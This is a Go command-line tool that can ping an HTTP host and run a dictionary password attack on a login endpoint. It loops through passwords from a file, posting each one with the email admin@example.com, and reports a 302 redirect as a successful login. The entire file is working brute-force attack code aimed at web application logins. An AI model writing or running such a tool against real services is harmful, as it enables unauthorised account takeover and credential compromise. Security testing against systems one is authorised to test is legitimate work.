package main

import (
	"fmt"
	"net/http"
	"os"
	"flag"
	"net/url"
	"bufio"
)

func ping(target string) {
	fmt.Printf("Pinging %s ...", target)
	response, err := http.Get(target)

	if err != nil {
		fmt.Printf("%s\n", err)
		os.Exit(1)
	} else {
		defer response.Body.Close()
		fmt.Printf(" [%s]\n", response.Status)
	}
}

func loginAttack(target string, uri string) {
	endpoint := fmt.Sprintf("%s%s", target, uri)
	fmt.Println("Starting login attack on", endpoint)

	file, err := os.Open("dictionary.txt")
	if err != nil {
		fmt.Println(err)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	for _, password := range lines {
		data := url.Values{}
		data.Set("inputEmail", "admin@example.com")
		data.Set("inputPassword", password)

		response, err := http.PostForm(endpoint, data)
		if err != nil {
			fmt.Println(err)
		}
		defer response.Body.Close()
		fmt.Println(response.Status)
		if (response.StatusCode == 302) {
			fmt.Println("The password is:", password)
		}
	}
}

func main() {
	pingPtr := flag.Bool("ping", false, "Test to see if a host is available")

	hostPtr := flag.String("host", "", "Set the host")
	portPtr := flag.Int("port", 80, "Set the port")

	loginAttackPtr := flag.String("loginAttack", "", "Hit the login endpoint of an application")

	flag.Parse()

	var target string

	if (*hostPtr != "" && *portPtr != 0) {
		target = fmt.Sprintf("http://%s:%d", *hostPtr, *portPtr)
	} else {
		fmt.Println("Must supply a host and port")
		os.Exit(1)
	}

	if (*pingPtr == true) {
		ping(target)
		os.Exit(0)
	}

	if (*loginAttackPtr != "") {
		loginAttack(target, *loginAttackPtr)
		os.Exit(0)
	}
}
